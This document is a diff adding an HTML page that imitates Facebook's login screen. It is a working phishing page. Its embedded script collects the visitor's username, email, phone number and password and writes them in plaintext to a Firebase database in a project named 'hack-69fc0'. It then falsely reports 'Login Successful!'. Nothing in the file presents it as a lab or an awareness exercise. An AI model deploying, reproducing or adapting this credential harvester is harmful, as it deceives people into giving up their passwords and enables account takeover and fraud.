@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 396px;
+        }
+        h1 {
+            color: #1877f2;
+            font-size: 40px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        p {
+            color: #606770;
+            font-size: 15px;
+            line-height: 24px;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+        input[type="text"], input[type="password"], input[type="email"], input[type="tel"] {
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            padding: 14px 16px;
+            width: 100%;
+            margin-bottom: 12px;
+        }
+        button {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 14px 16px;
+            width: 100%;
+            cursor: pointer;
+            margin-bottom: 12px;
+        }
+        button:hover {
+            background-color: #166fe5;
+        }
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            text-align: center;
+            display: block;
+            margin-bottom: 20px;
+        }
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .create-account {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 14px 16px;
+            width: 100%;
+            cursor: pointer;
+        }
+        .create-account:hover {
+            background-color: #36a420;
+        }
+        .error {
+            color: #ff0000;
+            font-size: 14px;
+            margin-bottom: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>facebook</h1>
+        <p>Connect with friends and the world around you on Facebook.</p>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Username" required>
+            <input type="email" id="email" placeholder="Email" required>
+            <input type="tel" id="phone" placeholder="Phone Number" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <div id="error" class="error"></div>
+            <button id="submit" type="submit">Log In</button>
+        </form>
+        <a href="#" class="forgot-password">Forgot password?</a>
+        <div class="divider"></div>
+        <button class="create-account">Create New Account</button>
+    </div>
+
+    <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyC3taGFE2N-kU-IPDzkkltLRL6BX4TsH6Y",
+            authDomain: "hack-69fc0.firebaseapp.com",
+            projectId: "hack-69fc0",
+            storageBucket: "hack-69fc0.appspot.com",
+            messagingSenderId: "321585324370",
+            appId: "1:321585324370:web:ecd28cc32038508d46da8b"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+
+        // Get a reference to the database
+        const db = getDatabase(app);
+
+        document.getElementById("submit").addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            // Collect user input values
+            var username = document.getElementById("username").value;
+            var email = document.getElementById("email").value;
+            var phone = document.getElementById("phone").value;
+            var password = document.getElementById("password").value;
+            var error = document.getElementById("error");
+
+            // Validate that all fields are filled
+            if (username && email && phone && password) {
+                // Set user data in Firebase
+                set(ref(db, 'users/' + username), {
+                    username: username,
+                    email: email,
+                    phoneNumber: phone,
+                    password: password
+                }).then(() => {
+                    alert("Login Successful!");
+                    error.textContent = '';
+                }).catch((error) => {
+                    alert("Error: " + error.message);
+                });
+            } else {
+                error.textContent = 'Please fill all fields.';
+            }
+        });
+    </script>
+</body>
+</html>
